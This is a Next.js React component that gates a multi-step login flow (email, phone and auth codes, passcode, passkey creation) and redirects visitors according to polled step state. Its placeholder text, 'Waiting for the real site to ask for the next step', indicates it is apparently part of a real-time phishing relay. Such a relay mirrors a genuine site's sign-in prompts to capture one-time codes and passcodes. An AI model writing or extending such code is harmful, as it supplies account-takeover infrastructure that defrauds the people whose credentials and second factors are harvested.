"use client";

import { useEffect } from "react";
import { useRouter } from "next/navigation";
import type { ReactNode } from "react";
import { useStepState, type StepState } from "@/hooks/useStepState";

const STEP_PAGES: Record<string, string> = {
  login: "/login",
  "email-code": "/email-code",
  "phone-code": "/phone-code",
  "auth-code": "/auth-code",
  passcode: "/passcode",
  preparing: "/preparing",
  "passkey-creating": "/passkey-creating",
  "passkey-done": "/passkey-done",
  done: "/login",
};

interface StepGateProps {
  step: string;
  children: (state: StepState) => ReactNode;
}

export function StepLoading({ message }: { message?: string }) {
  return (
    <div className="flex flex-col items-center justify-center py-24 text-center">
      <span
        aria-hidden="true"
        className="h-9 w-9 animate-spin rounded-full border-2 border-transparent border-t-[#e5e7eb]"
      />
      <p className="mt-6 max-w-[420px] text-base font-medium text-grey-200">
        {message ?? "Waiting for the real site to ask for the next step..."}
      </p>
    </div>
  );
}

export function PasscodeLoading({ message }: { message?: string }) {
  return (
    <div className="flex w-full max-w-[512px] flex-col items-center justify-center py-24 text-center">
      <span
        aria-hidden="true"
        className="h-9 w-9 animate-spin rounded-full border-2 border-transparent border-t-[#e5e7eb]"
      />
      <p className="mt-6 max-w-[420px] text-base font-medium text-grey-200">
        {message ?? "Verifying..."}
      </p>
    </div>
  );
}

export function StepGate({ step, children }: StepGateProps) {
  const router = useRouter();
  const state = useStepState(300);

  useEffect(() => {
    if (!state) return;
    const target = STEP_PAGES[state.step];
    if (target && target !== `/${step}`) {
      router.replace(target);
    }
  }, [state, step, router]);

  if (!state || state.step !== step) {
    return <PasscodeLoading />;
  }
  return <>{children(state)}</>;
}
